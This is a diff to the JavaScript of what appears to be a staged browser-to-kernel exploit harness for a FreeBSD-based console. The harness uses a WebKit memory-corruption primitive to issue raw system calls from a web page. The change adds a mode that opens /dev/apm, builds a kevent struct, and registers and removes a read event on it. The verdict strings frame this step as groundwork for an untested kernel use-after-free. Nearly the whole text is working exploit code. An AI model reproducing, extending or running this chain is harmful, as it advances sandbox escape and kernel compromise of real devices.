@@ -11,13 +11,13 @@ let passCount = 0,
   failCount = 0;
 let armedEver = false;
 const params = new URLSearchParams(location.search);
-const HOST_AUDIT_MODE = params.get("stop") === "host" || params.get("stop") === "native" || params.get("stop") === "apm";
+const HOST_AUDIT_MODE = params.get("stop") === "host" || params.get("stop") === "native" || (params.get("stop") === "apm" || params.get("stop") === "apm-events");
 const MOCHI_DIAG = params.get("diag") === "full";
 const MOCHI_MODE = params.get("stop");
 // Explicit, non-kernel routes only. Unknown or legacy kernel URLs are refused
 // before the WebKit primitive is started. This package has no active Afterglow import.
 const MOCHI_ROUTE_ALLOWED = (
-  (MOCHI_MODE === "primitive" || MOCHI_MODE === "host" || MOCHI_MODE === "native" || MOCHI_MODE === "apm") &&
+  (MOCHI_MODE === "primitive" || MOCHI_MODE === "host" || MOCHI_MODE === "native" || MOCHI_MODE === "apm" || MOCHI_MODE === "apm-events") &&
   !params.has("afterglow") && !params.has("kpstep") &&
   !params.has("payload") && !params.has("patch")
 );
@@ -307,6 +307,8 @@ function check(name, ok, detail) {
 
 const SYS = {
   open: 5,
+  kqueue: 362,
+  kevent: 363,
   getpid: 20,
   getuid: 0x18,
   close: 6,
@@ -453,7 +455,8 @@ let allDone = false,
 
     const PRIMITIVE_ONLY = params.get("stop") === "primitive";
     const HOST_VALIDATE = params.get("stop") === "host";
-    const APM_REACH = params.get("stop") === "apm";
+    const APM_EVENTS = params.get("stop") === "apm-events";
+    const APM_REACH = params.get("stop") === "apm" || APM_EVENTS;
     const NATIVE_VALIDATE = params.get("stop") === "native" || APM_REACH;
     if (MOCHI_DIAG) {
       mark("MOCHI-RUN", "v0.4.4-R3 mode=" + MOCHI_MODE + " attempts=" + ATTEMPTS + " firmware-user-agent=" + fwKey + " original-engine=v0.4.4 inherited-webkit=13.52/14.00");
@@ -843,7 +846,11 @@ let allDone = false,
         seeded++;
       }
     }
-    const requiredSyscalls = Object.keys(SYS).filter((k) => k !== "open" || APM_REACH);
+    const requiredSyscalls = Object.keys(SYS).filter((k) => {
+      if (k === "open") return APM_REACH;
+      if (k === "kqueue" || k === "kevent") return APM_EVENTS;
+      return true;
+    });
     const need = new Set(
       requiredSyscalls
         .map((k) => SYS[k])
@@ -1081,11 +1088,16 @@ let allDone = false,
         nativeError = error;
         mark("MOCHI-STOP", "code=NATIVE-CALL-EXCEPTION detail=" + String(error));
       }
-      // Keep the main function pointer in the established native bridge until
-      // the bounded APM syscalls complete, then restore it in all cases.
+      // Stage 5: exactly one APM event registration and explicit deletion.
+      // No event polling, notifications, races, ioctl, spray or kernel memory access.
+      // If attach fails, the failure/errno is evidence, not an exploit verdict.
       let apmFd = -1, apmOpenErrno = null, apmClose = null, apmError = null;
+      let eventVerdict = "NOT-RUN", kqFd = -1, evAddRc = null, evDeleteRc = null;
+      let evAddErrno = null, evDeleteErrno = null, kqCloseRc = null;
       if (APM_REACH && nativeError === null) {
-        mark("MOCHI-APM", "BEGIN single-open-close path=/dev/apm event-registration=no ioctl=no kernel-write=no");
+        mark("MOCHI-APM", APM_EVENTS
+          ? "BEGIN one-event-lifecycle open->register->delete->close no-race no-kernel-rw"
+          : "BEGIN single-open-close path=/dev/apm event-registration=no ioctl=no kernel-write=no");
         try {
           const pathString = "/dev/apm";
           const pathBuffer = new ArrayBuffer(16);
@@ -1096,20 +1108,74 @@ let allDone = false,
           apmFd = sc(SYS.open, bufAddr(pathBuffer), 0, 0).i32;
           if (apmFd < 0) {
             apmOpenErrno = errno();
-            mark("MOCHI-APM", "OPEN-FAILED fd=" + apmFd + " errno=" + apmOpenErrno + " kernel-not-tested");
+            mark("MOCHI-APM", "OPEN-FAILED fd=" + apmFd + " errno=" + apmOpenErrno);
+            eventVerdict = "OPEN-FAILED";
           } else {
-            mark("MOCHI-APM", "OPEN-OK descriptor-acquired no-kevent-registration");
+            mark("MOCHI-APM", "OPEN-OK descriptor-acquired");
+            if (APM_EVENTS) {
+              kqFd = sc(SYS.kqueue).i32;
+              if (kqFd < 0) {
+                const e = errno();
+                mark("MOCHI-EVENT", "KQUEUE-FAILED fd=" + kqFd + " errno=" + e);
+                eventVerdict = "QUEUE-FAILED";
+              } else {
+                mark("MOCHI-EVENT", "KQUEUE-OK descriptor-acquired");
+                // FreeBSD/Orbis amd64 struct kevent: 8+2+2+4+8+8 = 32 bytes.
+                const evBuf = new ArrayBuffer(32), evView = new DataView(evBuf);
+                keepAlive.push(evBuf, evView);
+                const evAddr = bufAddr(evBuf);
+                function setEvent(flag) {
+                  for (let i = 0; i < 32; i += 4) evView.setUint32(i, 0, true);
+                  evView.setUint32(0, apmFd >>> 0, true); // ident=fd, high half zero
+                  evView.setInt16(8, -1, true);           // EVFILT_READ
+                  evView.setUint16(10, flag, true);       // EV_ADD / EV_DELETE
+                }
+                setEvent(0x0001); // EV_ADD, no EV_CLEAR, no event polling
+                evAddRc = sc(SYS.kevent, kqFd, evAddr, 1, 0, 0, 0).i32;
+                if (evAddRc < 0) {
+                  evAddErrno = errno();
+                  eventVerdict = "REGISTRATION-REFUSED";
+                  mark("MOCHI-EVENT", "REGISTER-REFUSED rc=" + evAddRc + " errno=" + evAddErrno);
+                } else {
+                  mark("MOCHI-EVENT", "REGISTER-OK rc=" + evAddRc + " filter=READ flags=ADD");
+                  // Explicitly detach before either descriptor is closed.
+                  setEvent(0x0002); // EV_DELETE
+                  evDeleteRc = sc(SYS.kevent, kqFd, evAddr, 1, 0, 0, 0).i32;
+                  if (evDeleteRc < 0) {
+                    evDeleteErrno = errno();
+                    eventVerdict = "DELETE-FAILED";
+                    mark("MOCHI-EVENT", "DELETE-FAILED rc=" + evDeleteRc + " errno=" + evDeleteErrno);
+                  } else {
+                    eventVerdict = "REGISTER-DELETE-PASS";
+                    mark("MOCHI-EVENT", "DELETE-OK rc=" + evDeleteRc);
+                  }
+                }
+              }
+            }
           }
         } catch (e) {
-          apmError = "OPEN-EXCEPTION " + String(e);
+          apmError = "OPERATION-EXCEPTION " + String(e);
+          eventVerdict = "EXCEPTION";
           mark("MOCHI-APM", apmError);
         } finally {
+          // Close kqueue first to release registered events if DELETE failed.
+          if (kqFd >= 0) {
+            try {
+              kqCloseRc = sc(SYS.close, kqFd).i32;
+              mark("MOCHI-EVENT", "QUEUE-CLOSE rc=" + kqCloseRc);
+            } catch (e) {
+              apmError = "QUEUE-CLOSE-EXCEPTION " + String(e);
+              eventVerdict = "CLEANUP-FAILED";
+              mark("MOCHI-EVENT", apmError);
+            }
+          }
           if (apmFd >= 0) {
             try {
               apmClose = sc(SYS.close, apmFd).i32;
               mark("MOCHI-APM", "CLOSE-RESULT rc=" + apmClose + " one-descriptor-only");
             } catch (e) {
               apmError = "CLOSE-EXCEPTION " + String(e);
+              eventVerdict = "CLEANUP-FAILED";
               mark("MOCHI-APM", apmError);
             }
           }
@@ -1123,10 +1189,13 @@ let allDone = false,
       }
       if (APM_REACH) {
         const reachable = apmFd >= 0 && apmClose === 0 && !apmError && valid && restored;
-        const label = reachable ? "REACHABLE" : (apmFd < 0 && apmOpenErrno !== null ? "DENIED-OR-MISSING" : "FAILED");
-        mark("MOCHI-APM", "VERDICT=" + label + " driver-open-close-only UAF=NOT-TESTED kernel-rw=NOT-TESTED");
-        mark("MOCHI-TERMINAL", "mode=apm result=" + label + " restored=" + (restored ? "VERIFIED" : "NOT-VERIFIED") + " kernel=no");
-        state(reachable ? "APM driver reachable; UAF not tested" : "APM reachability inconclusive or denied", reachable ? "good" : "bad");
+        const eventComplete = eventVerdict === "REGISTER-DELETE-PASS" && kqCloseRc === 0 && reachable;
+        const label = APM_EVENTS
+          ? (eventComplete ? "LIFECYCLE-PASS" : (eventVerdict === "NOT-RUN" ? "FAILED" : eventVerdict))
+          : (reachable ? "REACHABLE" : (apmFd < 0 && apmOpenErrno !== null ? "DENIED-OR-MISSING" : "FAILED"));
+        mark(APM_EVENTS ? "MOCHI-EVENT" : "MOCHI-APM", "VERDICT=" + label + " UAF=NOT-TESTED kernel-rw=NOT-TESTED kernel-exec=NOT-TESTED");
+        mark("MOCHI-TERMINAL", "mode=" + (APM_EVENTS ? "apm-events" : "apm") + " result=" + label + " restored=" + (restored ? "VERIFIED" : "NOT-VERIFIED") + " kernel=no");
+        state(APM_EVENTS ? (eventComplete ? "APM event registration/removal passed; UAF not tested" : "APM event lifecycle incomplete: " + label) : (reachable ? "APM driver reachable; UAF not tested" : "APM reachability inconclusive or denied"), (APM_EVENTS ? eventComplete : reachable) ? "good" : "bad");
       } else {
         if (valid && restored) mark("NATIVE-ONLY-PASS", "getpid/getuid succeeded; function-pointer-restored-and-verified; kernel-not-tested");
         mark("MOCHI-TERMINAL", "mode=native result=" + (valid && restored ? "PASS" : "FAIL") + " restored=" + (restored ? "VERIFIED" : "NOT-VERIFIED") + " kernel=no");
@@ -1134,7 +1203,7 @@ let allDone = false,
       }
       allDone = true;
       try { clearInterval(watchdog); } catch (ignored) {}
-      finishUI(APM_REACH ? (apmFd >= 0 && apmClose === 0 && !apmError && valid && restored) : (valid && restored));
+      finishUI(APM_REACH ? (APM_EVENTS ? (eventVerdict === "REGISTER-DELETE-PASS" && kqCloseRc === 0 && apmFd >= 0 && apmClose === 0 && !apmError && valid && restored) : (apmFd >= 0 && apmClose === 0 && !apmError && valid && restored)) : (valid && restored));
       return;
     }
     // Fail closed if a future change bypasses the explicit mode branches.
